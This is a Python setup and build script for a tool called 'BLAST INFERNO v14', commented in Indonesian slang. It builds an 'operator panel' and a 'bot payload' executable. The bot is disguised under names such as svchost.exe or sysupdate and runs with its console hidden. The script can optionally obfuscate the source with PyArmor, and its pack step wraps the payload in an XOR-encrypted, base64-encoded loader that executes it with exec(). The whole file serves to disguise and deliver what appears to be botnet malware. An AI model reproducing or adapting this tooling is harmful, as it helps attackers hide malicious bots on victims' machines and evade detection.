#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  BLAST INFERNO v14 — SETUP / BUILD SCRIPT                       ║
║  Install dependencies | Build EXE | Obfuscate | Pack payload    ║
╚══════════════════════════════════════════════════════════════════╝

Usage:
  python3 setup.py install        → Install semua dependencies
  python3 setup.py build          → Build executable
  python3 setup.py build-operator → Build operator panel EXE
  python3 setup.py build-bot      → Build bot payload EXE
  python3 setup.py build-all      → Build operator + bot
  python3 setup.py obfuscate      → Obfuscate source code
  python3 setup.py pack           → Pack payload terenkripsi
  python3 setup.py clean          → Bersihin build files
"""

import os
import sys
import shutil
import subprocess
import platform
import base64
import json
import hashlib
import secrets
from pathlib import Path

# ═══════════════════════════════════════════════════
# CONFIGURATION — UBAH SESUAI KEBUTUHAN LO
# ═══════════════════════════════════════════════════

CONFIG = {
    # Main script
    "main_script": "blast_inferno.py",
    
    # Output
    "output_dir": "dist",
    "build_dir": "build",
    
    # Nama output EXE
    "operator_name": "SystemUpdate.exe" if sys.platform == "win32" else "system_update",
    "bot_name": "svchost.exe" if sys.platform == "win32" else "sysupdate",
    
    # Icon (opsional — kasih path ke .ico file)
    "icon_file": None,  # "icon.ico"
    
    # PyInstaller options
    "onefile": True,         # Single EXE
    "console": False,        # False = hidden console (Windows)
    "uac_admin": False,      # Request admin di Windows
    
    # Obfuscation (butuh PyArmor)
    "use_pyarmor": False,
    "pyarmor_options": "--advanced 2 --restrict",
    
    # Dependencies
    "required_packages": [
        "aiohttp>=3.9.0",
        "aiohttp_socks>=0.9.0",
    ],
    
    "optional_packages": {
        "cryptography": "cryptography>=41.0.0",
        "brotli": "brotli>=1.1.0",
        "scapy": "scapy>=2.5.0",
        "playwright": "playwright>=1.40.0",
        "paramiko": "paramiko>=3.4.0",
    },
    
    # Files to include in build
    "include_files": [],
    
    # Hidden imports (biar PyInstaller nemu semua)
    "hidden_imports": [
        "aiohttp", "aiohttp.client", "aiohttp.connector",
        "aiohttp_socks", "ssl", "socket", "hashlib",
        "json", "base64", "hmac", "threading", "asyncio",
        "concurrent.futures", "urllib.parse", "dataclasses",
    ],
}

IS_WINDOWS = sys.platform == "win32"
IS_LINUX = sys.platform.startswith("linux")

def print_banner():
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║       BLAST INFERNO v14 — SETUP / BUILD TOOL                 ║
    ╚══════════════════════════════════════════════════════════════╝
    """)

def run_cmd(cmd: str, shell: bool = False) -> bool:
    """Run command and return success."""
    print(f"  [CMD] {cmd[:100]}...")
    try:
        result = subprocess.run(cmd, shell=shell, capture_output=True, text=True)
        if result.returncode != 0:
            if result.stderr: print(f"  [ERR] {result.stderr[:200]}")
            return False
        return True
    except Exception as e:
        print(f"  [ERR] {e}")
        return False

def check_python():
    """Check Python version."""
    ver = sys.version_info
    if ver.major < 3 or (ver.major == 3 and ver.minor < 9):
        print(f"[!] Python 3.9+ required. Current: {ver.major}.{ver.minor}")
        sys.exit(1)
    print(f"[+] Python {ver.major}.{ver.minor}.{ver.micro} — OK")

def install_dependencies():
    """Install semua dependencies."""
    print("\n[+] Installing dependencies...")
    
    # Upgrade pip
    run_cmd([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
    
    # Required packages
    print("\n  [+] Required packages:")
    for pkg in CONFIG["required_packages"]:
        run_cmd([sys.executable, "-m", "pip", "install", pkg])
    
    # Optional packages
    print("\n  [+] Optional packages:")
    for name, pkg in CONFIG["optional_packages"].items():
        try:
            __import__(name.replace("-", "_"))
            print(f"    [✓] {name} already installed")
        except ImportError:
            print(f"    [+] Installing {name}...")
            if run_cmd([sys.executable, "-m", "pip", "install", pkg]):
                print(f"    [✓] {name} installed")
            else:
                print(f"    [!] {name} failed (optional, gak masalah)")
    
    # Install PyInstaller
    print("\n  [+] Build tools:")
    run_cmd([sys.executable, "-m", "pip", "install", "pyinstaller"])
    
    # Install PyArmor (optional)
    if CONFIG["use_pyarmor"]:
        run_cmd([sys.executable, "-m", "pip", "install", "pyarmor"])
    
    print("\n[+] Dependencies installed!")

def obfuscate_source():
    """Obfuscate source code pake PyArmor."""
    if not CONFIG["use_pyarmor"]:
        print("[!] PyArmor disabled. Set 'use_pyarmor': True di CONFIG.")
        return
    
    print("\n[+] Obfuscating source code...")
    
    src = CONFIG["main_script"]
    if not os.path.exists(src):
        print(f"[!] {src} not found!")
        return
    
    cmd = f'pyarmor gen {CONFIG["pyarmor_options"]} --output dist_obfuscated {src}'
    if run_cmd(cmd, shell=True):
        print(f"[+] Obfuscated: dist_obfuscated/{src}")
    else:
        print("[!] Obfuscation failed. Install pyarmor: pip install pyarmor")

def build_executable(mode: str = "operator"):
    """Build executable pake PyInstaller."""
    print(f"\n[+] Building {mode} executable...")
    
    src = CONFIG["main_script"]
    if not os.path.exists(src):
        print(f"[!] {src} not found!")
        print("[!] Make sure blast_inferno.py is in the same directory.")
        return
    
    # Clean previous build
    clean_build()
    
    # Determine output name
    if mode == "operator":
        output_name = CONFIG["operator_name"]
        console_mode = True  # Operator panel butuh console
    else:
        output_name = CONFIG["bot_name"]
        console_mode = CONFIG["console"]
    
    # Build PyInstaller command
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--name", output_name.replace(".exe", ""),
        "--distpath", CONFIG["output_dir"],
        "--workpath", CONFIG["build_dir"],
        "--specpath", CONFIG["build_dir"],
    ]
    
    if CONFIG["onefile"]:
        cmd.append("--onefile")
    
    if not console_mode:
        cmd.append("--noconsole")
        cmd.append("--windowed")
    
    if CONFIG["uac_admin"]:
        cmd.append("--uac-admin")
    
    if CONFIG["icon_file"] and os.path.exists(CONFIG["icon_file"]):
        cmd.extend(["--icon", CONFIG["icon_file"]])
    
    # Add hidden imports
    for imp in CONFIG["hidden_imports"]:
        cmd.extend(["--hidden-import", imp])
    
    # Add data files
    for f in CONFIG["include_files"]:
        if os.path.exists(f):
            cmd.extend(["--add-data", f"{f}{';' if IS_WINDOWS else ':'}."])
    
    # Add mode argument
    # Kita bikin spec file biar bisa passing --mode
    cmd.extend(["--add-data", f"blast_inferno.py{';' if IS_WINDOWS else ':'}."])
    
    # Source file + arg buat jadiin mode
    cmd.append(src)
    
    print(f"  Output: {CONFIG['output_dir']}/{output_name}")
    print(f"  Mode: {mode}")
    print(f"  Onefile: {CONFIG['onefile']}")
    print(f"  Console: {console_mode}")
    
    if run_cmd(cmd):
        print(f"\n[+] Build successful: {CONFIG['output_dir']}/{output_name}")
        
        # Show file size
        output_path = os.path.join(CONFIG["output_dir"], output_name)
        if os.path.exists(output_path):
            size_mb = os.path.getsize(output_path) / (1024 * 1024)
            print(f"[+] File size: {size_mb:.1f} MB")
    else:
        print("\n[!] Build failed. Check errors above.")

def build_all():
    """Build both operator and bot."""
    build_executable("operator")
    build_executable("bot")
    print("\n[+] All builds complete!")
    print(f"[+] Files in {CONFIG['output_dir']}/:")
    for f in os.listdir(CONFIG["output_dir"]):
        print(f"    {f}")

def pack_payload():
    """Pack encrypted payload buat distribusi."""
    print("\n[+] Packing encrypted payload...")
    
    src = CONFIG["main_script"]
    if not os.path.exists(src):
        print(f"[!] {src} not found!")
        return
    
    # Read source
    with open(src, 'rb') as f:
        source = f.read()
    
    # Encrypt pake XOR + base64
    key = secrets.token_bytes(32)
    encrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(source)])
    encoded = base64.b64encode(encrypted).decode()
    
    # Bikin loader
    loader = f'''
import base64
import os
_key = {key!r}
_data = "{encoded}"
_decoded = base64.b64decode(_data)
_exec = bytes([b ^ _key[i % len(_key)] for i, b in enumerate(_decoded)])
exec(_exec)
'''
    
    # Save loader
    loader_path = os.path.join(CONFIG["output_dir"], "payload_loader.py")
    os.makedirs(CONFIG["output_dir"], exist_ok=True)
    with open(loader_path, 'w') as f:
        f.write(loader)
    
    # Compress
    import zipfile
    zip_path = os.path.join(CONFIG["output_dir"], "payload_encrypted.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.write(loader_path, "payload.py")
    
    print(f"[+] Loader: {loader_path}")
    print(f"[+] Packed: {zip_path}")
    print(f"[+] Key (simpan!): {base64.b64encode(key).decode()}")

def clean_build():
    """Clean build artifacts."""
    print("\n[+] Cleaning build files...")
    
    for d in [CONFIG["build_dir"], CONFIG["output_dir"]]:
        if os.path.exists(d):
            try:
                shutil.rmtree(d)
                print(f"    Removed: {d}")
            except:
                print(f"    Failed to remove: {d}")
    
    # Remove .spec files
    for f in Path(".").glob("*.spec"):
        try:
            f.unlink()
            print(f"    Removed: {f}")
        except:
            pass
    
    # Remove PyArmor output
    for d in Path(".").glob("dist_obfuscated*"):
        try:
            shutil.rmtree(d)
            print(f"    Removed: {d}")
        except:
            pass

def show_help():
    print("""
    USAGE: python3 setup.py [COMMAND]
    
    COMMANDS:
      install          Install semua dependencies
      build            Build executable (default: operator)
      build-operator   Build operator panel EXE
      build-bot        Build bot payload EXE (hidden console)
      build-all        Build operator + bot
      obfuscate        Obfuscate source code (butuh PyArmor)
      pack             Pack encrypted payload
      clean            Bersihin build files
      help             Show this help
    
    EXAMPLES:
      python3 setup.py install
      python3 setup.py build-operator
      python3 setup.py build-bot
      python3 setup.py build-all
      python3 setup.py pack
    """)

def main():
    print_banner()
    check_python()
    
    if len(sys.argv) < 2:
        show_help()
        return
    
    cmd = sys.argv[1].lower()
    
    if cmd == "install":
        install_dependencies()
    elif cmd == "build":
        build_executable("operator")
    elif cmd == "build-operator":
        build_executable("operator")
    elif cmd == "build-bot":
        build_executable("bot")
    elif cmd == "build-all":
        build_all()
    elif cmd == "obfuscate":
        obfuscate_source()
    elif cmd == "pack":
        pack_payload()
    elif cmd == "clean":
        clean_build()
    elif cmd in ("help", "--help", "-h"):
        show_help()
    else:
        print(f"[!] Unknown command: {cmd}")
        show_help()

if __name__ == "__main__":
    main()
